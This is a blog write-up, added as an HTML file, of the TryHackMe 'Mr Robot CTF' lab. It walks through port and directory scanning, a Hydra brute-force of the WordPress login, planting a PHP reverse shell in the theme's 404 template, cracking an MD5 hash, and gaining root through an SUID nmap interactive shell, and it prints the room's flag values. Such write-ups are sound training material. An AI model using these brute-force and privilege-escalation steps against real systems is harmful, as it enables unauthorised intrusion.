@@ -1,0 +1,516 @@
+<!doctype html><html lang=en-us>
+<head><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Intro This time we&amp;rsquo;re breaking a machine from the &amp;ldquo;Mr Robot CTF&amp;rdquo; room over on TryHackMe.
+Reconnaissance The room itself on TryHackMe does not give much to go on, apart from the fact that the machine itself is inspired by the show Mr. Robot.
+Scanning &amp;amp; Discovery RustScan I decided to use I&amp;rsquo;ve heard a bunch about - RustScan. It pins down open ports much more efficiently, cutting down the amount of time needed for, say, a full port scan on a box."><title>TryHackMe: Mr Robot CTF</title>
+<link rel=canonical href=https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/>
+<link rel=stylesheet href=/scss/style.min.5f343aefda6021d7c99a35d0d8a06abdad13d86982967b5b28f1008e404a346d.css><meta property="og:title" content="TryHackMe: Mr Robot CTF">
+<meta property="og:description" content="Intro This time we&amp;rsquo;re breaking a machine from the &amp;ldquo;Mr Robot CTF&amp;rdquo; room over on TryHackMe.
+Reconnaissance The room itself on TryHackMe does not give much to go on, apart from the fact that the machine itself is inspired by the show Mr. Robot.
+Scanning &amp;amp; Discovery RustScan I decided to use I&amp;rsquo;ve heard a bunch about - RustScan. It pins down open ports much more efficiently, cutting down the amount of time needed for, say, a full port scan on a box.">
+<meta property="og:url" content="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/">
+<meta property="og:site_name" content="WeaponizedPeach >> Infosec">
+<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:published_time" content="2022-02-17T15:50:05+02:00"><meta property="article:modified_time" content="2022-02-17T15:50:05+02:00"><meta property="og:image" content="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/cover.png">
+<meta name=twitter:title content="TryHackMe: Mr Robot CTF">
+<meta name=twitter:description content="Intro This time we&amp;rsquo;re breaking a machine from the &amp;ldquo;Mr Robot CTF&amp;rdquo; room over on TryHackMe.
+Reconnaissance The room itself on TryHackMe does not give much to go on, apart from the fact that the machine itself is inspired by the show Mr. Robot.
+Scanning &amp;amp; Discovery RustScan I decided to use I&amp;rsquo;ve heard a bunch about - RustScan. It pins down open ports much more efficiently, cutting down the amount of time needed for, say, a full port scan on a box."><meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://weaponizedpeach.github.io/p/tryhackme-mr-robot-ctf/cover.png">
+<link rel="shortcut icon" href=favicon.ico>
+</head>
+<body class="article-page has-toc">
+<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"dark")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
+<div class="container main-container flex
+extended">
+<div id=article-toolbar>
+<a href=/ class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
+<span>Back</span>
+</a>
+</div>
+<main class="main full-width">
+<article class="has-image main-article">
+<header class=article-header>
+<div class=article-image>
+<a href=/p/tryhackme-mr-robot-ctf/>
+<img src=/p/tryhackme-mr-robot-ctf/cover_hu6683ae8eaa3abdaafe440783ba904183_54217_800x0_resize_box_3.png srcset="/p/tryhackme-mr-robot-ctf/cover_hu6683ae8eaa3abdaafe440783ba904183_54217_800x0_resize_box_3.png 800w, /p/tryhackme-mr-robot-ctf/cover_hu6683ae8eaa3abdaafe440783ba904183_54217_1600x0_resize_box_3.png 1600w" width=800 height=200 loading=lazy alt="Featured image of post TryHackMe: Mr Robot CTF">
+</a>
+</div>
+<div class=article-details>
+<header class=article-category>
+<a href=/categories/thm/>
+THM
+</a>
+<a href=/categories/writeup/>
+Writeup
+</a>
+<a href=/categories/medium/>
+Medium
+</a>
+<a href=/categories/web/>
+Web
+</a>
+<a href=/categories/wordpress/>
+Wordpress
+</a>
+<a href=/categories/rce/>
+RCE
+</a>
+<a href=/categories/cms/>
+CMS
+</a>
+</header>
+<h2 class=article-title>
+<a href=/p/tryhackme-mr-robot-ctf/>TryHackMe: Mr Robot CTF</a>
+</h2>
+<footer class=article-time>
+<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Feb 17, 2022</time>
+</div>
+<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>
+10 minute read
+</time>
+</div>
+</footer>
+</div>
+</header>
+<section class=article-content>
+<h2 id=intro>Intro</h2>
+<p>This time we&rsquo;re breaking a machine from the &ldquo;Mr Robot CTF&rdquo; room <a class=link href=https://tryhackme.com/room/mrrobot target=_blank rel=noopener>over on TryHackMe</a>.</p>
+<h2 id=reconnaissance>Reconnaissance</h2>
+<p>The room itself on TryHackMe does not give much to go on, apart from the fact that the machine itself is inspired by the show <a class=link href=https://www.imdb.com/title/tt4158110/ target=_blank rel=noopener>Mr. Robot</a>.</p>
+<h2 id=scanning--discovery>Scanning & Discovery</h2>
+<h3 id=rustscan>RustScan</h3>
+<p>I decided to use I&rsquo;ve heard a bunch about - <a class=link href=https://github.com/RustScan/RustScan target=_blank rel=noopener>RustScan</a>. It pins down open ports much more efficiently, cutting down the amount of time needed for, say, a full port scan on a box.</p>
+<p>For starters, let&rsquo;s go with an initial scan:</p>
+<pre tabindex=0><code>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
+
+[~] The config file is expected to be at &quot;/home/rustscan/.rustscan.toml&quot;
+[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
+Open 10.10.172.225:80
+Open 10.10.172.225:443
+[~] Starting Script(s)
+[&gt;] Script to be run Some(&quot;nmap -vvv -p {{port}} {{ip}}&quot;)
+
+[~] Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-09 21:24 UTC
+Initiating Ping Scan at 21:24
+Scanning 10.10.172.225 [2 ports]
+Completed Ping Scan at 21:24, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 21:24
+Completed Parallel DNS resolution of 1 host. at 21:24, 0.00s elapsed
+DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 21:24
+Scanning 10.10.172.225 [2 ports]
+Discovered open port 443/tcp on 10.10.172.225
+Discovered open port 80/tcp on 10.10.172.225
+Completed Connect Scan at 21:24, 0.05s elapsed (2 total ports)
+Nmap scan report for 10.10.172.225
+Host is up, received syn-ack (0.054s latency).
+Scanned at 2022-02-09 21:24:42 UTC for 0s
+
+PORT    STATE SERVICE REASON
+80/tcp  open  http    syn-ack
+443/tcp open  https   syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
+</code></pre><h3 id=whatweb>whatweb</h3>
+<p>Whatweb did not tell me much, apart that the box is running on some version of Apache.
+<code>http://10.10.111.68 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.111.68], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]</code></p>
+<h3 id=browser>Browser</h3>
+<p>It seems we have a web server, both HTTP and HTTPS, let&rsquo;s check it out.</p>
+<p>While the website itself is very elaborate for a pentesting machine, going along with the &lsquo;terminal&rsquo; didn&rsquo;t really lead me anywhere productive.</p>
+<p>There doesn&rsquo;t seem to be a difference functionality-wise whether I accessed it via HTTP or HTTPS. The self-signed SSL certificate file doesn&rsquo;t leak any subdomains.</p>
+<p><code>/sitemap.xml</code> doesn&rsquo;t give anything at all.</p>
+<p><code>/robots.txt</code> is very promising, however:
+<figure class=gallery-image style=flex-grow:207;flex-basis:497px>
+<a href=/p/tryhackme-mr-robot-ctf/robots.txt.png data-size=116x56>
+<img src=/p/tryhackme-mr-robot-ctf/robots.txt.png width=116 height=56 srcset="/p/tryhackme-mr-robot-ctf/robots.txt_hub1e29886086db96297708c1e8a1f287a_3523_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/robots.txt_hub1e29886086db96297708c1e8a1f287a_3523_1024x0_resize_box_3.png 1024w" loading=lazy alt=robots.txt>
+</a>
+<figcaption>robots.txt</figcaption>
+</figure></p>
+<p>Sure enough, /key-1-of-3.txt leads us to the first key for this CTF: <code>073403c8a58a1f80d943455fb30724b9</code>
+<figure class=gallery-image style=flex-grow:1078;flex-basis:2587px>
+<a href=/p/tryhackme-mr-robot-ctf/key1.png data-size=248x23>
+<img src=/p/tryhackme-mr-robot-ctf/key1.png width=248 height=23 srcset="/p/tryhackme-mr-robot-ctf/key1_hu9e8510997529079783b598ca2dcd79b8_3837_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/key1_hu9e8510997529079783b598ca2dcd79b8_3837_1024x0_resize_box_3.png 1024w" loading=lazy alt=/key-1-of-3.txt>
+</a>
+<figcaption>/key-1-of-3.txt</figcaption>
+</figure></p>
+<p>The <code>/fsocity.dic</code> seems to be a dictionary file of sorts, line seperated, one entry per line. Might prove useful later.</p>
+<p>Skimming through the source code of the website clues me into that this is actually a Wordpress site, even though it doesn&rsquo;t look like it. Specifically, links to <code>wp-content</code> and <code>https://wordpress.org/</code></p>
+<p><figure class=gallery-image style=flex-grow:451;flex-basis:1083px>
+<a href=/p/tryhackme-mr-robot-ctf/wordpress_source_code.png data-size=1345x298>
+<img src=/p/tryhackme-mr-robot-ctf/wordpress_source_code.png width=1345 height=298 srcset="/p/tryhackme-mr-robot-ctf/wordpress_source_code_hu3a31b79307d06bd1629f154c8c2b8918_27946_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/wordpress_source_code_hu3a31b79307d06bd1629f154c8c2b8918_27946_1024x0_resize_box_3.png 1024w" loading=lazy alt="WordPress source code">
+</a>
+<figcaption>WordPress source code</figcaption>
+</figure></p>
+<h3 id=feroxbuster>feroxbuster</h3>
+<p>Since we now know this is a WordPress site, we know it is a Content Management System (CMS). There should be a dashboard somewhere for content management, which coincidentally (especially on WordPress) often has opportunities for remote code execution (RCE).</p>
+<p>Trying to simply go to <code>/admin</code> puts us into a redirect loop, not leading us anywhere.</p>
+<p>Try to crack open the big guns and do a directory scan with <a class=link href=https://github.com/epi052/feroxbuster target=_blank rel=noopener>feroxbuster</a>. Similar to RustScan, this tool is also written in Rust. I like how it can scan a list of directories in parallel, making it faster. I used <code>directory_list-2.3-big</code> from <a class=link href=https://github.com/danielmiessler/SecLists target=_blank rel=noopener>SecLists</a>.</p>
+<pre tabindex=0><code>301      GET        7l       20w      234c http://10.10.172.225/blog =&gt; http://10.10.172.225/blog/
+301      GET        7l       20w      236c http://10.10.172.225/images =&gt; http://10.10.172.225/images/
+200      GET        0l        0w        0c http://10.10.172.225/sitemap
+302      GET        0l        0w        0c http://10.10.172.225/login =&gt; http://10.10.172.225/wp-login.php
+301      GET        0l        0w        0c http://10.10.172.225/rss =&gt; http://10.10.172.225/feed/
+301      GET        0l        0w        0c http://10.10.172.225/images/rss =&gt; http://10.10.172.225/images/feed/
+301      GET        0l        0w        0c http://10.10.172.225/blog/rss =&gt; http://10.10.172.225/blog/feed/
+301      GET        7l       20w      235c http://10.10.172.225/video =&gt; http://10.10.172.225/video/
+301      GET        0l        0w        0c http://10.10.172.225/0 =&gt; http://10.10.172.225/0/
+301      GET        0l        0w        0c http://10.10.172.225/feed =&gt; http://10.10.172.225/feed/
+301      GET        0l        0w        0c http://10.10.172.225/image =&gt; http://10.10.172.225/image/
+301      GET        0l        0w        0c http://10.10.172.225/atom =&gt; http://10.10.172.225/feed/atom/
+301      GET        0l        0w        0c http://10.10.172.225/images/feed =&gt; http://10.10.172.225/images/feed/
+301      GET        0l        0w        0c http://10.10.172.225/blog/feed =&gt; http://10.10.172.225/blog/feed/
+301      GET        0l        0w        0c http://10.10.172.225/video/rss =&gt; http://10.10.172.225/video/feed/
+301      GET        7l       20w      240c http://10.10.172.225/wp-content =&gt; http://10.10.172.225/wp-content/
+301      GET        7l       20w      235c http://10.10.172.225/admin =&gt; http://10.10.172.225/admin/
+301      GET        0l        0w        0c http://10.10.172.225/images/atom =&gt; http://10.10.172.225/images/feed/atom/
+301      GET        0l        0w        0c http://10.10.172.225/blog/atom =&gt; http://10.10.172.225/blog/feed/atom/
+301      GET        0l        0w        0c http://10.10.172.225/0/rss =&gt; http://10.10.172.225/0/feed/
+301      GET        0l        0w        0c http://10.10.172.225/feed/rss =&gt; http://10.10.172.225/feed/
+200      GET       30l       98w     1188c http://10.10.172.225/admin/index
+301      GET        7l       20w      242c http://10.10.172.225/admin/images =&gt; http://10.10.172.225/admin/images/
+301      GET        7l       20w      235c http://10.10.172.225/audio =&gt; http://10.10.172.225/audio/
+200      GET     2028l    11941w   516314c http://10.10.172.225/intro
+301      GET        7l       20w      248c http://10.10.172.225/wp-content/uploads =&gt; http://10.10.172.225/wp-content/uploads/
+301      GET        7l       20w      246c http://10.10.172.225/images/headlines =&gt; http://10.10.172.225/images/headlines/
+</code></pre><p>We get back a lot of directories. The one that stands out to me the most is http://10.10.172.225/wp-login.php, let&rsquo;s check it out.</p>
+<h3 id=browser-wp-loginphp-12>Browser: /wp-login.php (1/2)</h3>
+<p>Here we get a nice, typical WordPress login page. I will admit I was stuck here for a long time, not knowing how to proceed. the <code>readme.html</code> file doesn&rsquo;t leak any info about the WordPress version.</p>
+<p><figure class=gallery-image style=flex-grow:1748;flex-basis:4196px>
+<a href=/p/tryhackme-mr-robot-ctf/readme.html.png data-size=542x31>
+<img src=/p/tryhackme-mr-robot-ctf/readme.html.png width=542 height=31 srcset="/p/tryhackme-mr-robot-ctf/readme.html_hu94944168b174434e586e09d27d5f543c_6562_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/readme.html_hu94944168b174434e586e09d27d5f543c_6562_1024x0_resize_box_3.png 1024w" loading=lazy alt=readme.html>
+</a>
+<figcaption>readme.html</figcaption>
+</figure></p>
+<p>Trying to attack the form itself via sqlmap was also unsuccessful.</p>
+<h3 id=wpscan>WPScan</h3>
+<pre tabindex=0><code>_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://10.10.111.68/wp-login.php/ [10.10.111.68]
+[+] Started: Thu Feb 10 00:45:08 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Powered-By: PHP/5.5.29
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] WordPress readme found: http://10.10.111.68/wp-login.php/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] This site seems to be a multisite
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | Reference: http://codex.wordpress.org/Glossary#Multisite
+
+[+] The external WP-Cron seems to be enabled: http://10.10.111.68/wp-login.php/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+ | Found By: Query Parameter In Install Page (Aggressive Detection)
+ |  - http://10.10.111.68/wp-includes/css/buttons.min.css?ver=4.3.1
+ |  - http://10.10.111.68/wp-includes/css/dashicons.min.css?ver=4.3.1
+ | Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)
+ |  - http://10.10.111.68/wp-includes/css/buttons.min.css?ver=4.3.1
+ |  - http://10.10.111.68/wp-includes/css/dashicons.min.css?ver=4.3.1
+ |
+ | [!] 86 vulnerabilities identified:
+ | ...
+ | ...
+ | ...
+[i] The main theme could not be detected.
+
+
+[i] No plugins Found.
+
+
+[i] No Config Backups Found.
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 1
+ | Requests Remaining: 24
+
+[+] Finished: Thu Feb 10 00:45:15 2022
+[+] Requests Done: 142
+[+] Cached Requests: 184
+[+] Data Sent: 38.716 KB
+[+] Data Received: 108.936 KB
+[+] Memory used: 195.27 MB
+[+] Elapsed time: 00:00:07
+</code></pre><p><code>[!] 86 vulnerabilities identified</code></p>
+<p>Now that is a lot. Unfortunately, many required authentication, which we didn&rsquo;t have (yet). Many were focused on XSS, which also isn&rsquo;t super useful for this CTF format. The ones that focused on RCE depended on plugins that this site did not have.</p>
+<p>Maybe I was thinking about this too hard.</p>
+<h3 id=browser-wp-loginphp-22>Browser: /wp-login.php (2/2)</h3>
+<p>It&rsquo;s time to come back to the <code>fsocity.dic</code> file, given it does look as a possible username & password list. However, given the 7MB size and 858160 entries in this file, trying to both find a viable username AND the password for it would have taken forever.</p>
+<p>I did more research about the show (Mr. Robot) the box is based on. I tried out several usernames. Fortunately, WordPress leaks viable usernames, by giving a different prompt if the username exists. <code>Elliot</code> is one of them.</p>
+<p><figure class=gallery-image style=flex-grow:88;flex-basis:211px>
+<a href=/p/tryhackme-mr-robot-ctf/elliot_incorrect_pass.png data-size=335x380>
+<img src=/p/tryhackme-mr-robot-ctf/elliot_incorrect_pass.png width=335 height=380 srcset="/p/tryhackme-mr-robot-ctf/elliot_incorrect_pass_huc477a72cf2038ddf8563568e37f3ce00_15278_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/elliot_incorrect_pass_huc477a72cf2038ddf8563568e37f3ce00_15278_1024x0_resize_box_3.png 1024w" loading=lazy alt="Possible Username">
+</a>
+<figcaption>Possible Username</figcaption>
+</figure></p>
+<p>Now that we have a possible username, let&rsquo;s try to determine the password.</p>
+<h3 id=hydra>Hydra</h3>
+<p>With username and wordlist in hand, let&rsquo;s start up Hydra and try to figure out the password:</p>
+<pre tabindex=0><code>hydra -l Elliot -P ../downloads/fsocity.dic 10.10.111.68 -V http-post-form '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.111.68%2Fwp-admin%2F&amp;testcookie=1:S=Location
+</code></pre><p>Eventually, we get a hit. Time to login.</p>
+<pre tabindex=0><code>[80][http-post-form] host: 10.10.111.68   login: Elliot   password: ER28-0652
+</code></pre><h2 id=exploitation>Exploitation</h2>
+<h3 id=browser-wp-loginphp-admin-dashboard>Browser: /wp-login.php (Admin dashboard)</h3>
+<p>Upon logging in we are greeted with a dashboard.</p>
+<p><figure class=gallery-image style=flex-grow:364;flex-basis:875px>
+<a href=/p/tryhackme-mr-robot-ctf/admin_panel.png data-size=1904x522>
+<img src=/p/tryhackme-mr-robot-ctf/admin_panel.png width=1904 height=522 srcset="/p/tryhackme-mr-robot-ctf/admin_panel_hu86e1845e2984a11d62250e5340274e51_51547_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/admin_panel_hu86e1845e2984a11d62250e5340274e51_51547_1024x0_resize_box_3.png 1024w" loading=lazy alt="Admin Dashboard">
+</a>
+<figcaption>Admin Dashboard</figcaption>
+</figure></p>
+<p>The plugins section had a bunch of plugins, but none seemed to have exploitation opportunities. Fortunately, going to <code>Appearance -> Editor</code> allows us to edit various page templates. This is a great place to insert some malicious code and possibly get a reverse shell. I hopped onto <a class=link href=https://www.revshells.com/ target=_blank rel=noopener>RevShells</a> and grabbed a PHP reverse shell script. I inserted it into the &ldquo;404 Template&rdquo;, as it seemed to easiest to exploit.</p>
+<p><figure class=gallery-image style=flex-grow:243;flex-basis:584px>
+<a href=/p/tryhackme-mr-robot-ctf/revshell.png data-size=1897x779>
+<img src=/p/tryhackme-mr-robot-ctf/revshell.png width=1897 height=779 srcset="/p/tryhackme-mr-robot-ctf/revshell_hu8ad8d4ec8b4becee3f276e1a08c6f6b1_145526_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/revshell_hu8ad8d4ec8b4becee3f276e1a08c6f6b1_145526_1024x0_resize_box_3.png 1024w" loading=lazy alt="Template Editor">
+</a>
+<figcaption>Template Editor</figcaption>
+</figure></p>
+<p>Let&rsquo;s save it and try to provoke a 404 response.
+<figure class=gallery-image style=flex-grow:358;flex-basis:860px>
+<a href=/p/tryhackme-mr-robot-ctf/revshell_set-up.png data-size=172x48>
+<img src=/p/tryhackme-mr-robot-ctf/revshell_set-up.png width=172 height=48 srcset="/p/tryhackme-mr-robot-ctf/revshell_set-up_hufe22fa74fe4b01ff2adbd1e8268d4e31_2294_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/revshell_set-up_hufe22fa74fe4b01ff2adbd1e8268d4e31_2294_1024x0_resize_box_3.png 1024w" loading=lazy alt="404 Template with Reverse Shell saved">
+</a>
+<figcaption>404 Template with Reverse Shell saved</figcaption>
+</figure></p>
+<p>I set-up my netcat listener and went to a gibberish URL hoping the 404 template would kick in and with it, the reverse shell script.</p>
+<p><figure class=gallery-image style=flex-grow:331;flex-basis:795px>
+<a href=/p/tryhackme-mr-robot-ctf/user_access.png data-size=1044x315>
+<img src=/p/tryhackme-mr-robot-ctf/user_access.png width=1044 height=315 srcset="/p/tryhackme-mr-robot-ctf/user_access_hu9e5e27115eb395430461b6cdbdeecf53_244841_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/user_access_hu9e5e27115eb395430461b6cdbdeecf53_244841_1024x0_resize_box_3.png 1024w" loading=lazy alt="User Access">
+</a>
+<figcaption>User Access</figcaption>
+</figure></p>
+<p>And it worked!</p>
+<h2 id=privilege-escalation>Privilege Escalation</h2>
+<h3 id=horizontal-escalation-robot>Horizontal Escalation (robot)</h3>
+<p>Unfortunately, we don&rsquo;t seem to have a lot of permissions to pretty much anything with this user. Let&rsquo;s snoop around the <code>/home</code> directory.</p>
+<p><figure class=gallery-image style=flex-grow:142;flex-basis:340px>
+<a href=/p/tryhackme-mr-robot-ctf/password_hash.png data-size=385x271>
+<img src=/p/tryhackme-mr-robot-ctf/password_hash.png width=385 height=271 srcset="/p/tryhackme-mr-robot-ctf/password_hash_hu82650add3b23469d5b557edc591b383c_81381_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/password_hash_hu82650add3b23469d5b557edc591b383c_81381_1024x0_resize_box_3.png 1024w" loading=lazy alt="contents of /home/robot">
+</a>
+<figcaption>contents of /home/robot</figcaption>
+</figure></p>
+<p>Here we found a password hash the second key, to which we don&rsquo;t have access (yet). The <code>raw-md5</code> clues us in that this hash is MD5. Let&rsquo;s check <a class=link href=https://crackstation.net/ target=_blank rel=noopener>CrackStation</a>, maybe it has already been cracked in the past.</p>
+<p><figure class=gallery-image style=flex-grow:257;flex-basis:618px>
+<a href=/p/tryhackme-mr-robot-ctf/robot_password_cracked.png data-size=1011x392>
+<img src=/p/tryhackme-mr-robot-ctf/robot_password_cracked.png width=1011 height=392 srcset="/p/tryhackme-mr-robot-ctf/robot_password_cracked_hu517413d5c802e10f5c8c63e799e76544_41418_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/robot_password_cracked_hu517413d5c802e10f5c8c63e799e76544_41418_1024x0_resize_box_3.png 1024w" loading=lazy alt=Crackstation>
+</a>
+<figcaption>Crackstation</figcaption>
+</figure></p>
+<p>Fortunately, CrackStation already had an exact match for this hash. We can now login to the <code>robot</code> user with the password <code>abcdefghijklmnopqrstuvwxyz</code>.</p>
+<p><figure class=gallery-image style=flex-grow:148;flex-basis:355px>
+<a href=/p/tryhackme-mr-robot-ctf/robot_access_gained.png data-size=462x312>
+<img src=/p/tryhackme-mr-robot-ctf/robot_access_gained.png width=462 height=312 srcset="/p/tryhackme-mr-robot-ctf/robot_access_gained_huc33537c8fe0a83d48eedda193c90acfd_107400_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/robot_access_gained_huc33537c8fe0a83d48eedda193c90acfd_107400_1024x0_resize_box_3.png 1024w" loading=lazy alt="Login with user &lsquo;robot&rsquo;">
+</a>
+<figcaption>Login with user ‘robot’</figcaption>
+</figure></p>
+<p>I had issues getting <code>su</code> to work, so I just spawned a shell with Python and that got it working.</p>
+<p><code>robot</code> access allowed me to read the <code>key-2-of-3.txt</code> file that I wasn&rsquo;t able to previously -> <code>822c73956184f694993bede3eb39f959</code></p>
+<h3 id=vertical-escalation-root>Vertical escalation (root)</h3>
+<p>It was now time for the final obstacle: the root user.</p>
+<h4 id=suid-binaries>SUID Binaries</h4>
+<p>I scanned the system for unusual SUID binaries, this is one of the first areas I look for when trying to obtain privilege escalation, as it is one of the easiest and least time consuming to exploit. I prefer to use this one-liner:</p>
+<pre tabindex=0><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre><p><figure class=gallery-image style=flex-grow:119;flex-basis:286px>
+<a href=/p/tryhackme-mr-robot-ctf/suid_binaries.png data-size=528x442>
+<img src=/p/tryhackme-mr-robot-ctf/suid_binaries.png width=528 height=442 srcset="/p/tryhackme-mr-robot-ctf/suid_binaries_hu543a549293deeb9023a5834f19c9bcec_179350_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/suid_binaries_hu543a549293deeb9023a5834f19c9bcec_179350_1024x0_resize_box_3.png 1024w" loading=lazy alt="SUID binaries">
+</a>
+<figcaption>SUID binaries</figcaption>
+</figure></p>
+<p>Among the results was an nmap binary, in <code>/usr/local/</code>, of all places. I checked out <a class=link href=https://gtfobins.github.io/gtfobins/nmap/#suid target=_blank rel=noopener>GTFOBins</a> section regarding nmap.</p>
+<p><figure class=gallery-image style=flex-grow:230;flex-basis:552px>
+<a href=/p/tryhackme-mr-robot-ctf/gtfobins_nmap_suid.png data-size=824x358>
+<img src=/p/tryhackme-mr-robot-ctf/gtfobins_nmap_suid.png width=824 height=358 srcset="/p/tryhackme-mr-robot-ctf/gtfobins_nmap_suid_hue966e42189d9e70c247f1c96a70b15a3_61500_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/gtfobins_nmap_suid_hue966e42189d9e70c247f1c96a70b15a3_61500_1024x0_resize_box_3.png 1024w" loading=lazy alt="GTFOBins: nmap (SUID)">
+</a>
+<figcaption>GTFOBins: nmap (SUID)</figcaption>
+</figure></p>
+<p>Attempting to exploit this misconfiguration proved challenging. However, upon fiddling with the binary, I noticed it was <code>nmap v.3.81</code> - a very old one, dating way way back to <em><strong>2005</strong></em>.</p>
+<p><figure class=gallery-image style=flex-grow:226;flex-basis:544px>
+<a href=/p/tryhackme-mr-robot-ctf/nmap_sudo.png data-size=848x374>
+<img src=/p/tryhackme-mr-robot-ctf/nmap_sudo.png width=848 height=374 srcset="/p/tryhackme-mr-robot-ctf/nmap_sudo_hu796a66e423b88002f1110c7e4a0ca26d_40293_480x0_resize_box_3.png 480w, /p/tryhackme-mr-robot-ctf/nmap_sudo_hu796a66e423b88002f1110c7e4a0ca26d_40293_1024x0_resize_box_3.png 1024w" loading=lazy alt="GTFOBins: nmap (SUDO)">
+</a>
+<figcaption>GTFOBins: nmap (SUDO)</figcaption>
+</figure>
+Upon closer inspection, this version seemed to be vulnerable to the SUDO exploit mentioned in scenario B of the aforementioned GTFOBins section.</p>
+<p>It was time to test this out.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>robot@linux:~$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 <span class=o>(</span> http://www.insecure.org/nmap/ <span class=o>)</span>
+Welcome to Interactive Mode -- press h &lt;enter&gt; <span class=k>for</span> <span class=nb>help</span>
+nmap&gt; !sh
+!sh
+<span class=c1># whoami</span>
+whoami
+root
+<span class=c1># cd /root</span>
+<span class=nb>cd</span> /root
+<span class=c1># ls</span>
+ls
+firstboot_done  key-3-of-3.txt
+<span class=c1># cat key-3-of-3.txt</span>
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+<span class=c1># </span>
